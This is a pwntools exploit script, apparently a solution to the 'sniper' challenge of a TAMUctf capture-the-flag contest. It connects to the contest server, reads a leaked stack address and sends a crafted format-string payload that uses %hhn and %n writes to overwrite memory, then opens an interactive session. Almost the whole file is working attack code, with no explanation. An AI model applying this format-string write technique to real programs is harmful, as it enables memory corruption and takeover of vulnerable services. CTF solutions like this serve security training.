from pwn import *

context.binary = ELF('sniper')
libc = ELF('libc.so.6')
ld = ELF('ld-2.28.so')

"""
context.terminal = ["tmux", "splitw", "-v"]
context.log_level = "debug"
io = process([ld.path, context.binary.path], env={"LD_PRELOAD": libc.path})
gdb.attach(io, '''
''')
"""
io = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_sniper")
# io = process()

addr = int(io.recvline().decode(), 16)
print(hex(addr))

count = 0xaa

target = addr + 5*8 - 2
low = target & 0xff
print(hex(target))
print(hex(low))


#             6       7       8       9       10      11      12
#             0-------1-------2-------3-------4-------5-------6-------
io.sendline(b'%24$209s%11$hhn%2361x%10$n      ' + p64(addr + 0x90 + 2) + p64(addr - 8) + b'\x00\x00\x00\x00')
print(b'%24$209s%11$hhn%2361x%10$n      ' + p64(addr + 0x90 + 2) + p64(addr - 8) + b'\x00\x00\x00\x00')
print(io.recvline())
print(io.recvline())
print(io.recvline())
breakpoint()

io.interactive()
